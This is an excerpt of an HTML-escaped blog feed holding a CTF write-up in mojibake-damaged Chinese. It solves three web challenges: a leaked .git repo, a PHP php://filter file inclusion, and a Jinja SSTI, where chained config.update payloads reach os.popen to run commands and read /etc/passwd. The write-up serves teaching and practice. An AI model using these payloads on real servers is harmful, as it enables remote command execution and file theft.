&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105144295.png" alt="image-20211024105144295">&lt;/p></description></item><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
&lt;blockquote>
&lt;p>Visit the website&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009120536593.png" alt="image-20211009120536593">&lt;/p>
&lt;p>emmmm è”ç³»è¿™ä¸ªé¢˜ç›® è®¿é—®ä¸€ä¸‹.gitçœ‹çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211019214445911.png" alt="image-20211019214445911">&lt;/p>
&lt;p>ç”¨GitHackerä¸‹è½½æ³„éœ²çš„gitæ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªindex.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Simple sodium crypto class for PHP &amp;gt;= 7.2
&lt;/span>&lt;span style="color:#d88200"> * @author MRK
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @return type
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">create_encryption_key&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sodium_crypto_secretbox_keygen&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Encrypt a message
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @param string $message - message to encrypt
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - encryption key created using create_encryption_key()
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$cipher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75af00">sodium_crypto_secretbox&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$cipher&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Decrypt a message
&lt;/span>&lt;span style="color:#d88200"> * @param string $encrypted - message encrypted with safeEncrypt()
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - key used for encryption
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">decrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the encoding failed&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">mb_strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_MACBYTES&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was truncated&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sodium_crypto_secretbox_open&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was tampered with in transit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$plain&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$privatekey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../flag.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$enc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$privatekey&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$enc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒ…å«äº†è§£å¯†çš„æ¨¡å—ï¼Œæ‰€ä»¥ç”¨å®ƒè§£å¯†ä¸€ä¸‹å³å¯&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œæˆ‘çš„æœ¬åœ°phpä¸€ç›´å‡ºé—®é¢˜ ç‰ˆæœ¬7.3.4å’Œ7.4.21éƒ½æŠ¥é”™&lt;/p>
&lt;h2 id="webnotrequired">Web/notrequired&lt;/h2>
&lt;blockquote>
&lt;p>Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?&lt;/p>
&lt;/blockquote>
&lt;p>æ³¨æ„åˆ°é“¾æ¥æ˜¯http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html&lt;/p>
&lt;p>ç”¨ä¼ªåè®®çœ‹ä¸€ä¸‹index.phpçš„æºç /index.php?file=php://filter/convert.base64-encode/resource=index.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009193402728.png" alt="image-20211009193402728">&lt;/p>
&lt;p>è®¿é—®/bin/secrets.txtï¼Œå¾—åˆ° QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==&lt;/p>
&lt;p>&lt;code>BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}&lt;/code>&lt;/p>
&lt;h2 id="webmadlib">Web/madlib&lt;/h2>
&lt;blockquote>
&lt;p>I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!&lt;/p>
&lt;p>Try it out and let me know what you think! The character length limit should make this app pretty secure.&lt;/p>
&lt;/blockquote>
&lt;p>ä¸€ä¸ªflaskçš„webapp&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211020005245072.png" alt="image-20211020005245072">&lt;/p>
&lt;p>å…ˆçœ‹ä¸‹æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/madlib&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">madlib&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">verb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;verb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">noun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;noun&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">adjective&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;adjective&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">person&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;person&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">place&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;place&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">place&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;your words must not be longer than 21 characters!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#111">madlib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;To find out what this is you must &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> the internet then get to the &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> system through the visual MAC hard drive and program the open-source but overriding the bus won&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> taught me this trick when we met in &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">place&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> allowing you to download the knowledge of what this is directly to your brain.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">madlib&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;This madlib only takes five words&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/app/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹åˆ°äº†ç†Ÿæ‚‰çš„æ¨¡æ¿æ¸²æŸ“ï¼ˆè¯­æ®µæ¥è‡ªäº&lt;a href="https://www.reddit.com/user/masterhacker_bot/">u/masterhacker_bot&lt;/a>ï¼‰ï¼Œåªä¼šæ¸²æŸ“ç‰¹å®šçš„ä½ç½®ï¼Œè€Œä¸”æœ‰ä¸ªç‰¹æ®Šçš„&lt;code>{adjective}.{person}&lt;/code>&lt;/p>
&lt;p>å­˜åœ¨5ä¸ªå¯ä»¥sstiçš„åœ°æ–¹ï¼Œä½†æ˜¯é™åˆ¶æ¯ä¸€ä¸ªæ¡†å­—ç¬¦æ•°å¿…é¡»åœ¨21ä¸ªä¹‹å†…ï¼›å…¶ä¸­è¿˜æœ‰ä¸¤ä¸ªéå¸¸ç‰¹æ®Šçš„&lt;code>{adjective}.{person}&lt;/code>è¿äº†èµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ª&lt;code>.&lt;/code>ç‚¹å·è¿æ¥æˆ‘ä»¬payloadçš„é•¿åº¦&lt;/p>
&lt;p>è¿™æ ·ç›¸å½“äºæœ‰4ä¸ªå¯ä»¥æ„é€ çš„åœ°æ–¹ï¼Œå‰ä¸¤ä¸ªç”¨æ¥å°†é•¿é•¿çš„payloadç”¨çŸ­çš„å˜é‡åŠé€†è¡Œæ›¿æ¢ï¼Œç¬¬ä¸‰ä¸ªæ˜¯payloadæœ¬ä½“ï¼Œç¬¬ä¸‰å’Œç¬¬å››ä¸ªä½ç½®å‡æ˜¯å›æ˜¾ä½ï¼›é¦–å…ˆé€šè¿‡&lt;code>config.update&lt;/code>æ–¹æ³•ä¸æ–­åœ°å‘åå–å€¼æ¥æ‹¿åˆ°å¯ä»¥ç”¨çš„å‡½æ•°å¹¶å°†å…¶å­˜å‚¨åœ¨&lt;code>config.a&lt;/code>ä¸­ï¼Œä¹‹åè°ƒç”¨å®ƒæ¥rce&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{{y(a=x
__class__.__init__)}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾&lt;code>&amp;lt;function Config.__init__ at 0x7fd75dae31e0&amp;gt;&lt;/code>ï¼Œç°åœ¨æˆ‘ä»¬è®¾æ³•è°ƒç”¨å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
__globals__['os'])}}
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾&lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.6/os.py'&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
popen)}}
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾&lt;code>&amp;lt;function popen at 0x7fd75ed5a730&amp;gt;&lt;/code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„&lt;code>config.a&lt;/code>å°±æ˜¯&lt;code>os.popen()&lt;/code>ï¼Œç°åœ¨æ¥è°ƒç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{{y('uname -a')
read()}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾&lt;code>Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux&lt;/code>ï¼ŒæˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œæ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œè¯»ä¸€æ³¢flag&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y('cat flag.txt')
read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;code>DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”å¾ˆå¹¸è¿çš„æ˜¯æœ€åæˆ‘ä»¬çš„payloadæ­£å¥½å°äº21ä¸ªå­—ç¬¦ï¼Œæ˜¾ç„¶æˆ‘ä»¬è¢«é•¿åº¦é™åˆ¶äº†å‘æŒ¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰åˆ«çš„trick&lt;/p>
&lt;p>Jinjaä¸ä»…æ”¯æŒæ¨¡æ¿å†…éƒ¨çš„å˜é‡èµ‹å€¼è¿˜æ”¯æŒ&lt;code>~&lt;/code>è¿›è¡Œå­—ç¬¦ä¸²çš„è¿æ¥ï¼Œå†åˆ©ç”¨ä¸Š&lt;code>config.command&lt;/code>ç”šè‡³èƒ½è¯»å‡º/etc/passwd&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{%set p='cat /etc'%}
{%set q=p~'/passw'%}
{{y(b=q~'d')}}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{%set z=config.b%}
{{z}}
{{y(z).read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211021172308541.png" alt="image-20211021172308541">&lt;/p>
